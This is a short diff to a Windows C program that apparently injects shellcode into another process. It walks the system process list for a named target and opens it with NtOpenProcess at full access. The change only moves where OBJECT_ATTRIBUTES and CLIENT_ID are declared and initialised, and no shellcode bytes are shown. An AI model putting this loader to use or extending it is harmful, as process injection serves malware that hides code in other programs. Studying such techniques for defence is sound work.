@@ -60,6 +60,9 @@ int wmain() {
 	HANDLE							hProcess = NULL;
 	HANDLE							hThread = NULL;
 
+	OBJECT_ATTRIBUTES ObjectAttributes;
+	CLIENT_ID ClientId;
+
 	PVOID	pShellcodeAddress = NULL;
 	SIZE_T	sSizeOfShellcode = sizeof(shellcode);
 	SIZE_T	sNumberOfBytesWritten = NULL;
@@ -105,19 +108,18 @@ int wmain() {
 		return FALSE;
 	}
 
-	// Initialize OBJECT_ATTRIBUTES and CLIENT_ID
-	OBJECT_ATTRIBUTES ObjectAttributes;
-	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
-	CLIENT_ID ClientId;
-
     // Enumerating SystemProcInfo, looking for process "szProcName"
     while (TRUE) {
         if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcessName) == 0) {
             printf("Found process\n");
+
+			// Setting the parameters for NtOpenProcess
+			InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
 			dwProcessId = (DWORD)SystemProcInfo->UniqueProcessId;
 			dwThreadId = (DWORD)SystemProcInfo->Threads[0].ClientId.UniqueThread;
-			ClientId.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
+			ClientId.UniqueProcess = (HANDLE)(ULONG_PTR) dwProcessId;
 			ClientId.UniqueThread = dwThreadId;
+
 			STATUS = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
 			if (STATUS != 0x0) {
 				printf("[!] NtOpenProcess Failed With Error : 0x%0.8X \n", STATUS);
